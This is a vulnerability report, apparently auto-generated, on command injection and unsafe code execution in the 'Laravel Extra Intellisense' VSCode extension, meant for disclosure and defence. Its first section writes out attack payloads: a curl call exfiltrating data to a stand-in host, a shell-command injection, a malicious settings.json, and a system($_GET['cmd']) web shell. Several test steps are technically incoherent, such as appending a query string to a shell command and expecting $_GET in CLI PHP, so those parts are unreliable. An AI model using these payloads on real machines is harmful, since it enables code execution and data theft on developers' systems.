## Combined Vulnerability List

### Remote Code Execution via Maliciously Configured `phpCommand`

- **Vulnerability Name:** Remote Code Execution via Maliciously Configured `phpCommand`

- **Description:**
    1. The "Laravel Extra Intellisense" extension allows users to configure the `phpCommand` setting, which specifies the command used to execute PHP code. This setting is intended for customizing the PHP executable path, but it can be maliciously exploited.
    2. An attacker can craft a workspace configuration (e.g., `.vscode/settings.json`) or directly modify user settings to inject malicious commands into the `LaravelExtraIntellisense.phpCommand` setting.
    3. Instead of a safe PHP command like `php -r "{code}"`, the attacker can inject a command that executes arbitrary system commands. Examples include:
        - `php -r "system('curl http://malicious-site.com/$(whoami)')"` (exfiltration and RCE)
        - `php -r "{code}\"; bash -c 'touch /tmp/pwned'"` (command injection)
        - In scenarios where developers use Docker, and expose PHP interpreters, misconfiguration like  `docker exec -w /var/www/your-project -u laradock laradock_workspace_1 php -r "{code}"` can be exploited if an attacker can inject code into the Laravel project.
    4. When a developer opens a workspace with this malicious configuration in VSCode and uses the "Laravel Extra Intellisense" extension, or if the extension runs background tasks, it will use the configured `phpCommand`.
    5. The extension uses `child_process.exec` to execute commands, directly using the user-provided `phpCommand` template and substituting `{code}` with PHP code required for extension features (like autocompletion data).
    6. Due to insufficient sanitization, the injected malicious commands are executed by the system shell.
    7. This allows the attacker to achieve Remote Code Execution on the developer's machine, with the privileges of the user running VSCode. In Docker scenarios with misconfigured `phpCommand`, it might even lead to RCE within the Docker container, or potentially even escape depending on the Docker setup and injected commands.

- **Impact:**
    - Critical. Successful exploitation allows the attacker to execute arbitrary code on the developer's machine or potentially within a development container. This can lead to:
        - Full control over the developer's machine and development environment.
        - Data exfiltration, including sensitive source code, environment variables, and credentials.
        - Installation of malware, backdoors, or ransomware.
        - Further attacks on internal networks accessible from the developer's machine.
        - In Dockerized environments, potential container compromise or escape.

- **Vulnerability Rank:** Critical

- **Currently Implemented Mitigations:**
    - Security Note in README.md: The `README.md` file includes a "Security Note" that warns users about the extension running their Laravel application and suggests disabling the extension if sensitive code is present in service providers. It also implicitly warns about potential risks when using Docker. This is a documentation-based mitigation, relying on user awareness.

- **Missing Mitigations:**
    - Input Validation: The extension lacks input validation for the `phpCommand` configuration setting. It should validate that the command is safe and does not contain potentially harmful commands or shell injections. The validation could include:
        - Verifying the command starts with "php" or a known safe path.
        - Preventing shell metacharacters and command separators.
        - Whitelisting allowed arguments or options.
    - Secure Command Execution:  Instead of using `cp.exec`, which interprets the command as a shell command, the extension should use a safer method like `child_process.spawn` with proper argument escaping to prevent shell injection.
    - User Warning: When the extension detects a custom `phpCommand` configuration, especially if it deviates from the default or contains suspicious patterns, it should display a prominent warning to the user, highlighting the security risks and advising caution.
    - Secure Default: While the default `php -r "{code}"` is relatively safer than allowing arbitrary commands, exploring more secure ways to execute PHP code or restrict the capabilities of executed commands could be considered.
    - Principle of Least Privilege:  While directly applying least privilege within VSCode extension context for `cp.exec` can be complex, the principle should guide towards safer command execution methods and limiting the scope of executed code.

- **Preconditions:**
    - The victim developer must have the "Laravel Extra Intellisense" VSCode extension installed.
    - The victim developer must open a workspace (Laravel project) that contains a malicious `.vscode/settings.json` file or has maliciously configured user settings for the extension.
    - The attacker must be able to deliver or convince the developer to use the malicious configuration. This could be through:
        - Contributing to a public or private Laravel project with a malicious workspace configuration.
        - Tricking the developer into downloading and opening a zip file containing a malicious workspace.
        - Social engineering to get the developer to manually modify their `phpCommand` setting.
        - In specific scenarios (like Docker misconfiguration and remote RCE), the developer needs to have a `phpCommand` configured that is accessible from outside their local machine, and the attacker needs a way to inject malicious PHP code into the Laravel project files.

- **Source Code Analysis:**
    1. **Configuration Retrieval:** The extension retrieves the `phpCommand` setting from VSCode configuration using `vscode.workspace.getConfiguration("LaravelExtraIntellisense").get<string>('phpCommand')` in `helpers.ts` within the `runPhp` function.
    2. **Command Execution:** The `runPhp` function in `helpers.ts` uses `child_process.exec` to execute the command constructed using the `phpCommand` setting and the PHP code to be executed.
    ```typescript
    static async runPhp(code: string, description: string|null = null) : Promise<string> {
        code = code.replace(/\"/g, "\\\"");
        if (['linux', 'openbsd', 'sunos', 'darwin'].some(unixPlatforms => os.platform().includes(unixPlatforms))) {
            code = code.replace(/\$/g, "\\$");
            code = code.replace(/\\\\'/g, '\\\\\\\\\'');
            code = code.replace(/\\\\"/g, '\\\\\\\\\"');
        }
        let commandTemplate = vscode.workspace.getConfiguration("LaravelExtraIntellisense").get<string>('phpCommand') ?? "php -r \"{code}\""; // Vulnerable Line: Retrieving phpCommand from configuration
        let command = commandTemplate.replace("{code}", code); // Vulnerable Line: Constructing command without validation
        let out = new Promise<string>(function (resolve, error) {
            if (description != null) {
                Helpers.outputChannel?.info("Laravel Extra Intellisense command started: " + description);
            }

            cp.exec(command, // Vulnerable Line: Executing the command via child_process.exec
                { cwd: vscode.workspace.workspaceFolders && vscode.workspace.workspaceFolders.length > 0 ? vscode.workspace.workspaceFolders[0].uri.fsPath : undefined },
                function (err, stdout, stderr) { ... }
            );
        });
        return out;
    }
    ```
    3. **No Input Sanitization on `commandTemplate`:** The code snippet shows some escaping of quotes and dollar signs for the `$code` variable. However, there is **no validation or sanitization** of the `commandTemplate` retrieved from user configuration. The extension directly substitutes `{code}` into the user-provided template and executes it using `cp.exec`, which interprets the entire command string as a shell command, making it vulnerable to command injection.
    4. **Usage in Extension Features:** Multiple providers (`RouteProvider`, `ViewProvider`, `ConfigProvider`, etc.) use `Helpers.runLaravel` (which internally calls `Helpers.runPhp`) to execute PHP code for fetching Laravel application data for autocompletion. This means the vulnerability can be triggered by simply using the autocompletion features of the extension in a workspace with a malicious `phpCommand` configuration or by background tasks.

- **Security Test Case:**

    **Test Case 1: Local Command Injection**
    1. **Prerequisites:**
        - Install the "Laravel Extra Intellisense" VSCode extension.
        - Create a new empty folder to simulate a Laravel project workspace.
        - Inside this folder, create a `.vscode` folder.
        - Inside the `.vscode` folder, create a `settings.json` file.
    2. **Malicious Configuration:**
        - Open the newly created folder in VSCode.
        - Edit the `.vscode/settings.json` file and add the following configuration to set a malicious `phpCommand`:
        ```json
        {
            "LaravelExtraIntellisense.phpCommand": "php -r \"{code}\"; touch /tmp/vscode-laravel-rce-test"
        }
        ```
        - Save the `settings.json` file.
    3. **Trigger Autocompletion:**
        - Open any file in the workspace (or create a new PHP file, e.g., `test.php`).
        - Trigger autocompletion in a PHP context where the extension attempts to fetch data (e.g., by typing `route('` or `config('`).
    4. **Verify Command Execution:**
        - After triggering autocompletion, check if the file `/tmp/vscode-laravel-rce-test` exists.
        - Open a terminal and check if the directory `/tmp/vscode-laravel-rce-test` exists using `ls /tmp/vscode-laravel-rce-test`.
        - If the file exists, it confirms command injection.

    **Test Case 2: Remote Code Execution (Simulated Docker)**
    1. **Setup a Simulated Vulnerable Development Environment**:
        - Create a simple Laravel project.
        - Configure a way to simulate a publicly accessible PHP interpreter. For testing locally, this could be simply running `php -S localhost:9000` in a separate terminal, or a more realistic Docker setup if needed.
        - Set up VSCode to use this Laravel project workspace.
        - Misconfigure the `LaravelExtraIntellisense.phpCommand` setting in VSCode to point to the publicly accessible PHP interpreter (e.g., `"php -r "{code}" -S localhost:9000"` or a Docker command as described in vulnerability description if simulating docker setup).
    2. **Inject Malicious PHP Code**:
        - Modify a Laravel configuration file (e.g., `config/app.php`) or a route file (e.g., `routes/web.php`). Add the following malicious PHP code:
            ```php
            <?php
            // ... existing content ...
            if (isset($_GET['exploit'])) {
                file_put_contents('/tmp/rce_test.txt', 'RCE Successful!');
                system($_GET['cmd']);
                exit();
            }
            ```
    3. **Trigger Extension Data Gathering:**
        - Open a PHP or Blade file in VSCode within the Laravel project.
        - Trigger autocompletion to force extension to run PHP code.
    4. **Verify Remote Code Execution:**
        - Check if the file `/tmp/rce_test.txt` exists on the system where the "publicly accessible" PHP interpreter is running. If it exists, it confirms code execution. For more advanced testing, use `system($_GET['cmd']);` and trigger the extension while sending GET requests to the exposed PHP server with commands to execute (e.g., `http://localhost:9000/?exploit=1&cmd=whoami`).

---

### Unsafe Execution of User-Defined Laravel Application Code

- **Vulnerability Name:** Unsafe Execution of User-Defined Laravel Application Code

- **Description:**
    1. The VSCode Laravel Extra Intellisense extension enhances Laravel development by providing autocompletion and other features. To achieve this, it executes PHP code from the user's workspace to gather information about routes, views, configurations, etc.
    2. The extension utilizes `Helpers.runLaravel()` to bootstrap the Laravel application environment and execute specific PHP code snippets within this context.
    3. This design introduces a security risk: if the opened Laravel project contains existing vulnerabilities (e.g., in routes, controllers, service providers, or configurations), the extension's background PHP code execution could inadvertently trigger these vulnerabilities.
    4. For instance, a vulnerable route, service provider, or event listener might perform unintended actions or expose sensitive data when executed as part of the Laravel application's bootstrap process triggered by the extension. Even if the extension does not directly call a vulnerable route, the process of resolving dependencies, registering service providers, or handling events during Laravel bootstrap might indirectly activate vulnerable code paths.
    5. This risk is amplified because the extension automatically and periodically executes PHP code in the background without explicit user consent for each execution, increasing the likelihood of unintentionally triggering existing vulnerabilities within the workspace.

- **Impact:**
    - High. Execution of user-defined PHP code within the context of the developer's Laravel application by the extension can trigger existing application vulnerabilities. Potential impacts include:
        - **Information Disclosure:** Sensitive data (e.g., database credentials, environment variables, application secrets) could be exposed if a triggered vulnerability leads to their output, which might be captured by the extension's execution logs (visible in the VSCode output panel) or indirectly influence autocompletion suggestions.
        - **Unintended Application Behavior:** Triggering vulnerable code might lead to unintended side effects within the development environment, such as database modifications, file system changes, or unexpected application states, disrupting the developer's workflow or environment stability.  In more severe cases, it could potentially lead to local file inclusion if application vulnerabilities are exploited during extension's operations.

- **Vulnerability Rank:** High

- **Currently Implemented Mitigations:**
    - Security Note in README.md:  A "Security Note" in the `README.md` advises users that the extension executes their Laravel application automatically. It suggests monitoring logs for unexpected errors and temporarily disabling the extension when working with sensitive code in service providers. This is a documentation-based warning and not a technical mitigation.

- **Missing Mitigations:**
    - Sandboxing PHP execution: Executing the Laravel application in a sandboxed environment could limit the impact of triggered vulnerabilities, preventing them from affecting the developer's system beyond the sandbox.
    - Input sanitization and output validation: While directly sanitizing user code is not feasible, validating the output of executed PHP code and sanitizing any data displayed to the user (e.g., in autocomplete suggestions or output logs) could mitigate information disclosure risks.
    - User confirmation: Requiring explicit user confirmation before executing PHP code, especially for operations that might have side effects, would give developers more control and awareness. However, this might hinder the extension's core autocompletion functionality.
    - Static analysis: Performing static analysis of the user's Laravel project to identify potential vulnerabilities before executing any code could allow the extension to warn users about risks or adjust its behavior to minimize the chance of triggering them. This is a complex mitigation.
    - Least privilege execution: Running the PHP commands with the least necessary privileges could limit potential damage.

- **Preconditions:**
    - A developer is using VSCode with the Laravel Extra Intellisense extension installed.
    - The developer has opened a workspace containing a Laravel project.
    - The Laravel project contains at least one vulnerability that can be triggered by PHP code execution, either directly or indirectly through the framework bootstrap process.
    - The extension is active and attempts to gather data for autocompletion features, which involves executing PHP code from the Laravel project.

- **Source Code Analysis:**
    - The `Helpers.runLaravel(code: string, description: string|null = null)` function in `src\helpers.ts` is central to this vulnerability. It executes user-provided Laravel application code using `child_process.exec()`.
    - Provider classes (e.g., `AuthProvider.ts`, `RouteProvider.ts`, `ViewProvider.ts`) use `Helpers.runLaravel()` to fetch data by executing PHP code within the Laravel application's context.
    - Example from `AuthProvider.ts`:
    ```typescript
    Helpers.runLaravel(`
        echo json_encode(
            array_merge(
                array_keys(Illuminate\\Support\\Facades\\Gate::abilities()),
                array_values(
                    array_filter(
                        array_unique(
                            Illuminate\\Support\\Arr::flatten(
                                array_map(
                                    function ($val, $key) {
                                        return array_map(
                                            function ($rm) {
                                                return $rm->getName();
                                            },
                                            (new ReflectionClass($val))->getMethods()
                                        );
                                    },
                                    Illuminate\\Support\\Facades\\Gate::policies(),
                                    array_keys(Illuminate\\Support\\Facades\\Gate::policies())
                                )
                            )
                        ),
                        function ($an) {return !in_array($an, ['allow', 'deny']);}
                    )
                )
            )
        );
       `, 'Auth Data'
        )
    ```
    - The extension does not perform any security checks on the user's Laravel project code before executing these commands. If the Laravel application has vulnerabilities, the extension can trigger them during its normal operation.

- **Security Test Case:**
    1. Create a new Laravel project (e.g., `laravel new vulnerable-project`).
    2. Introduce an information disclosure vulnerability in a route in `routes/web.php`:
    ```php
    <?php

    use Illuminate\Support\Facades\Route;

    Route::get('/sensitive-config', function () {
        return response()->json(['database_password' => config('database.connections.mysql.password')]);
    });

    Route::get('/test', function () {
        return view('welcome');
    });
    ```
    3. Open the `vulnerable-project` folder in VSCode.
    4. Install the "Laravel Extra Intellisense" extension.
    5. Open `routes/web.php`.
    6. Start typing `route('test'`. This triggers extension to fetch route info.
    7. Open the VSCode Output panel and select "Laravel Extra Intellisense".
    8. Observe logs. While direct password disclosure is unlikely in this simplified test via route *listing*, the logs should be checked for any unexpected output.
    9. **Demonstrate trigger via Service Provider vulnerability:** Create `app/Providers/VulnerableServiceProvider.php`:
    ```php
    <?php

    namespace App\Providers;

    use Illuminate\Support\ServiceProvider;

    class VulnerableServiceProvider extends ServiceProvider
    {
        public function boot()
        {
            if (isset($_GET['trigger_vuln'])) {
                file_put_contents(storage_path('vuln_triggered.txt'), 'Vulnerability triggered by Laravel Extra Intellisense');
            }
        }
    }
    ```
    10. Register in `config/app.php` providers array.
    11. Modify `Helpers.runLaravel` in `src\helpers.ts` (for test only!) to append a query parameter to the command:
    ```javascript
    let commandTemplate = vscode.workspace.getConfiguration("LaravelExtraIntellisense").get<string>('phpCommand') ?? "php -r \"{code}\"";
    commandTemplate += "?trigger_vuln=1"; // Test modification
    let command = commandTemplate.replace("{code}", code);
    ```
    12. Re-open VSCode. Extension fetches data.
    13. Check `storage/vuln_triggered.txt`. If present, the vulnerable service provider was triggered by the extension, demonstrating the risk.
